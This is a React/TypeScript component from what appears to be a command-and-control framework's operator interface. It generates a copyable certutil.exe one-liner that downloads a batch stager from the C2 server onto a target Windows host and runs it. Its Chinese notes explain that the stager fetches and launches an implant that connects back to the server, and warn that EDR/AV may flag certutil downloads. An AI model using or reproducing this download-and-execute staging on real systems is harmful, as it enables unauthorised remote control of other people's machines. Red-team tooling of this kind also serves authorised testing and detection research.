import { useState } from 'react';

interface Props {
  listenerId?: string;
}

export default function StagerPanel({ listenerId }: Props) {
  const [expanded, setExpanded] = useState(false);
  const [activeTab, setActiveTab] = useState<'windows' | 'linux'>('windows');
  const [copied, setCopied] = useState(false);

  // In production the backend serves the frontend, so window.location.origin is correct.
  // In development, VITE_SERVER_URL must be set (e.g. in web/.env) to the backend origin,
  // because the stager runs on the target machine which cannot reach the Vite dev proxy.
  const serverUrl = import.meta.env.VITE_SERVER_URL || window.location.origin;

  const certutilCommand = listenerId
    ? `certutil.exe -urlcache -split -f ${serverUrl}/s/${listenerId}/stager.bat C:\\Users\\Public\\run.bat && C:\\Users\\Public\\run.bat`
    : '';

  async function handleCopy() {
    if (!certutilCommand) return;
    try {
      await navigator.clipboard.writeText(certutilCommand);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {
      // Fallback for older browsers
      const textarea = document.createElement('textarea');
      textarea.value = certutilCommand;
      textarea.style.position = 'fixed';
      textarea.style.opacity = '0';
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  }

  return (
    <div className="card stager-panel">
      <div
        className="stager-header"
        onClick={() => setExpanded(!expanded)}
        role="button"
        tabIndex={0}
        onKeyDown={(e) => { if (e.key === 'Enter' || e.key === ' ') setExpanded(!expanded); }}
      >
        <span className="stager-arrow">{expanded ? '▼' : '▶'}</span>
        <span className="card-title" style={{ marginBottom: 0 }}>
          命令上线方式 (Command Staging)
        </span>
      </div>

      {expanded && (
        <div className="stager-content">
          {/* Platform tabs */}
          <div className="stager-tabs">
            <button
              className={`stager-tab ${activeTab === 'windows' ? 'active' : ''}`}
              onClick={(e) => { e.stopPropagation(); setActiveTab('windows'); }}
            >
              Windows
            </button>
            <button
              className="stager-tab disabled"
              disabled
              onClick={(e) => e.stopPropagation()}
              title="暂不支持"
            >
              Linux (暂不支持)
            </button>
          </div>

          {/* Windows content */}
          {activeTab === 'windows' && (
            <div className="stager-tab-content">
              {!listenerId ? (
                <p className="text-muted" style={{ fontSize: '0.85rem' }}>
                  当前 agent 未关联 listener，无法生成上线命令。请先创建并启动一个 listener。
                </p>
              ) : (
                <>
                  <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', marginBottom: 12 }}>
                    在目标 Windows 主机上执行以下命令，将自动下载并运行 implant：
                  </p>

                  <div className="stager-code-block">
                    <code className="stager-code">{certutilCommand}</code>
                  </div>

                  <button
                    className="btn btn-primary btn-sm stager-copy-btn"
                    onClick={(e) => { e.stopPropagation(); handleCopy(); }}
                  >
                    {copied ? '✓ 已复制' : '📋 复制命令'}
                  </button>

                  <div className="stager-notes">
                    <p><strong>工作原理：</strong></p>
                    <ol style={{ paddingLeft: 20, margin: '8px 0' }}>
                      <li><code>certutil.exe</code> 下载 stager.bat 脚本到本地</li>
                      <li>stager.bat 检测系统架构（64位/32位）</li>
                      <li>根据架构下载对应的 implant exe</li>
                      <li>自动启动 implant，连接回 C2 服务器</li>
                    </ol>

                    <p style={{ marginTop: 12 }}><strong>⚠ 注意事项：</strong></p>
                    <ul style={{ paddingLeft: 20, margin: '8px 0' }}>
                      <li><code>certutil.exe</code> 会缓存下载的 URL，若需重新下载请先运行 <code>certutil.exe -urlcache -split -f delete</code> 清理缓存</li>
                      <li>如果服务器使用自签名 TLS 证书，certutil 可能提示证书错误。可在测试环境中使用 <code>-f</code> 参数强制下载</li>
                      <li>确保目标主机能够访问服务器地址 <code style={{ wordBreak: 'break-all' }}>{serverUrl}</code></li>
                      <li>部分 EDR/AV 可能会检测 certutil 下载行为，请根据目标环境调整</li>
                    </ul>
                  </div>
                </>
              )}
            </div>
          )}

          {/* Linux placeholder */}
          {activeTab === 'linux' && (
            <div className="stager-tab-content">
              <p className="text-muted" style={{ fontSize: '0.85rem', padding: '16px 0' }}>
                Linux 上线方式暂未实现，敬请期待。
              </p>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
